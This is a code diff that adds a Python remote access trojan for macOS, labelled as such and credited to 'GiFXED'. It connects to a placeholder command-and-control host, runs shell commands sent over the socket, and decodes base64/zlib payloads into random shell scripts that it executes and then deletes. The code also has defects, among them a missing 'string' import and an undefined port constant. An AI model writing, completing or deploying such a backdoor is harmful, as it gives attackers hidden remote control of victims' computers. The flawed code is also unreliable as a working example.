@@ -1,0 +1,65 @@
+import base64
+import os
+import socket
+import subprocess
+import sys
+import zlib
+import random
+
+# Attribution information
+__author__ = 'GiFXED'
+__version__ = '1.0'
+
+# The following code is a remote access trojan created by GiFXED
+# It is designed to work on Mac operating systems
+
+def backdoor():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(('C2_SERVER_IP', C2_SERVER_PORT))
+            s.send(b'[+] Connection established\n')
+        except:
+            continue
+        data = s.recv(1024)
+        if data.startswith(b'cd'):
+            os.chdir(data[3:].rstrip())
+        elif data.startswith(b'exit'):
+            s.close()
+            break
+        elif data.startswith(b'shell '):
+            command = data[6:].rstrip()
+            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output = proc.stdout.read() + proc.stderr.read()
+            s.send(output)
+        else:
+            try:
+                data = base64.b64decode(data)
+                data = zlib.decompress(data)
+                # Run
+                if sys.platform.startswith('darwin'):
+                    filename = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + '.sh'
+                    with open(filename, 'w') as f:
+                        f.write(data)
+                    os.chmod(filename, 0o755)
+                    proc = subprocess.Popen('./' + filename, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    output = proc.stdout.read() + proc.stderr.read()
+                    output = zlib.compress(output)
+                    output = base64.b64encode(output)
+                    s.send(output)
+                    os.remove(filename)
+            except:
+                pass
+
+def generate_tag():
+    tag = ''
+    for i in range(8):
+        tag += chr(random.randint(97,122))
+    return tag
+
+__author__ += ' [{}]'.format(generate_tag())
+
+print("  o-o    o--o o   o o--o o-o   \no     o |     \ /  |    |  \  \n|  -o   O-o    O   O-o  |   O \no   | | |     / \  |    |  /  \n o-o  | o    o   o o--o o-o   \n")
+print('[+] running...')
+
+backdoor()
